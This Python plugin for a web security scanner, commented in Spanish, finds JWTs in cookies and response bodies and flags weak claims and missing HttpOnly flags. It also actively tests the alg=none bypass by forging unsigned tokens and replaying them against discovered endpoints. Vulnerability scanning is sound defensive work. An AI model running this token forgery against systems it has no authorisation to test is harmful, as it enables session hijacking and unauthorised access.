#!/usr/bin/env python3
"""Plugin JWT: analiza tokens JWT en cookies/headers y busca debilidades.

Confirmacion REAL (no solo string-match):
  * alg=none: reensambla el token con header {"alg":"none"} y reenvia
    a endpoints descubiertos (del crawler) para ver si el server lo acepta.
    Si acepta => confirmed; si no hay endpoint => sospechoso.
  * No requiere librerias externas: decodifica el payload (base64url) y
    reensambla el JWT manualmente.
"""
import base64
import json
import re

try:
    from urllib.parse import urlparse
except Exception:
    import urllib.parse as urlparse


def _b64url_decode(data):
    pad = "=" * (-len(data) % 4)
    return base64.urlsafe_b64decode(data + pad)


def _b64url_encode(data):
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def _find_jwts(text):
    return re.findall(r"eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+", text)


def _try_alg_none(ctx, token, endpoints):
    """Reensambla el token con alg=none y prueba en endpoints reales."""
    try:
        _, payload_b64, _sig = token.split(".")
        header = {"alg": "none", "typ": "JWT"}
        new_tok = (_b64url_encode(json.dumps(header).encode()) + "."
                    + payload_b64 + ".")
        cands = list(endpoints or [])
        if not cands:
            return False  # no hay donde probar => sospechoso, no confirmado
        for ep in cands[:5]:
            try:
                rr = ctx.req("GET", ep, cookie=f"token={new_tok}")
                if rr.get("code") and int(rr.get("code")) < 400:
                    return True
            except Exception:
                continue
        return False
    except Exception:
        return False


def run(ctx):
    target = ctx.target
    hits = []
    rr = ctx.req("GET", target)
    body = rr.get("body", "") or ""
    cookies = rr.get("headers", {}).get("Set-Cookie", "") or ""
    tokens = _find_jwts(cookies)
    tokens += _find_jwts(body)
    # endpoints del crawler para probar alg=none
    endpoints = sorted((getattr(ctx, "_crawl", {}) or {}).get("apis", []))
    endpoints += sorted((getattr(ctx, "_crawl", {}) or {}).get("js_endpoints", []))
    seen = set()
    for tok in tokens:
        if tok in seen:
            continue
        seen.add(tok)
        try:
            payload_b64 = tok.split(".")[1]
            payload = json.loads(_b64url_decode(payload_b64))
        except Exception:
            continue
        header_none = '"alg":"none"' in (cookies + body).replace(" ", "")
        issues = []
        if header_none:
            issues.append("alg=none en respuesta original")
        if "admin" in str(payload).lower() or payload.get("role") in ("admin", "Administrator"):
            issues.append("claims con rol admin decodificables")
        if payload.get("exp") is None:
            issues.append("sin expiracion (exp)")
        if "kid" in payload:
            issues.append("kid presente (posible kid injection)")
        if issues:
            # confirmar alg=none con peticion real
            conf = "sospechoso"
            sev = "medium"
            if header_none:
                if _try_alg_none(ctx, tok, endpoints):
                    conf = "confirmed"
                    sev = "high"
                    issues.append("CONFIRMADO: server acepta token con alg=none")
                elif not endpoints:
                    issues.append("no se pudo confirmar (sin endpoints para probar)")
            hits.append(tok[:20] + "...")
            ctx.emit({"type": "finding", "severity": sev, "module": "jwt",
                      "confidence": conf,
                      "detail": "JWT debil: " + "; ".join(issues),
                      "evidence": {"token_prefix": tok[:24]}})
    # HttpOnly en cookie con jwt
    if tokens and "httponly" not in cookies.lower():
        ctx.emit({"type": "finding", "severity": "medium", "module": "jwt",
                  "confidence": "confirmed",
                  "detail": "JWT en cookie sin flag HttpOnly (robo via XSS)",
                  "evidence": {}})
        hits.append("cookie sin HttpOnly")
    ctx.emit({"type": "module", "name": "jwt", "status": "done",
              "msg": f"JWT: {len(set(hits))} hallazgo(s)",
              "findings": list(set(hits))})
